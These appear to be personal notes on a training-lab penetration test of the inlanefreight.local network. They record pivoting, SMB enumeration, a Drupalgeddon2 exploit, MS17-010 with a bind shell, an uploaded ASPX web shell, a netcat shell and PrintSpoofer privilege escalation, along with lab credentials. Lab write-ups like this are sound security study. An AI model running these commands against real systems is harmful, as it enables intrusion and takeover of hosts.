The Live Engagement!!!!
![[Pasted image 20250611211934.png]]
![[Pasted image 20250611212247.png]]
```sh
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.204.126
# pivoting into the internal network
ligoloproxy6.2 -selfcert
./agent -connect 10.10.14.3:11601 -ignore-cert
ip route add 172.16.1.0/24 dev ligolo
172.16.1.12 blog.inlanefrieght.local
```
- [ ] 172.16.1.11
```sh
nmap -p139,445 --script smb* -v 172.16.1.11
Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)

echo '172.16.1.11   status.inlanefreight.local'  >> /etc/hosts
```
![[Pasted image 20250611225814.png]]
Exploitation!!!
```sh
nxc smb 172.16.1.11 -u guest -p '' --shares
```
![[Pasted image 20250612000239.png]]
- [ ] 172.16.1.12
```sh
echo  '172.16.1.12 inlanefreight.local blog.inlanefreight.local' >> /etc/hosts 
```
![[Pasted image 20250611224659.png]]
```
1-drupal.inlanefreight.local
Drupal 7.57, 2018-02-21
https://github.com/pimps/CVE-2018-7600
Drupal core 7.x <=7.57 Drupalgeddon2 CVE-2018-7600
Drupalgeddon3
3-blog.inlanefreight.local
http://blog.inlanefreight.local/data/config.ini
user: admin
pass: admin123!@#
cp Lightweight-facebook-styled-blog_RCE_exploit.rb /usr/share/metasploit-framework/modules/exploits/linux/http
```
![[Pasted image 20250612213128.png]]
Exploitation!!!!
```sh
python2 drupa7-CVE-2018-7600.py  http://drupal.inlanefreight.local*

NB:  blind shell can save your ass....
```
![[Pasted image 20250612203701.png]]
![[Pasted image 20250612205232.png]]
![[Pasted image 20250612205252.png]]
- [ ] 172.16.1.13
```
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/shell/bind_tcp
```
![[Pasted image 20250614020458.png]]
![[Pasted image 20250614021041.png]]
```sh
http://172.16.1.13:80
cp /opt/nishang/Antak-WebShell/antak.aspx .
```
![[Pasted image 20250612073003.png]]
```
C:\Users\Public\nc64.exe -lp 7070 -e xxxx.exe
```
![[Pasted image 20250614013842.png]]
![[Pasted image 20250614013952.png]]
```
.\PrintSpoofer64.exe -i -c cmd
```
![[Pasted image 20250614014953.png]]
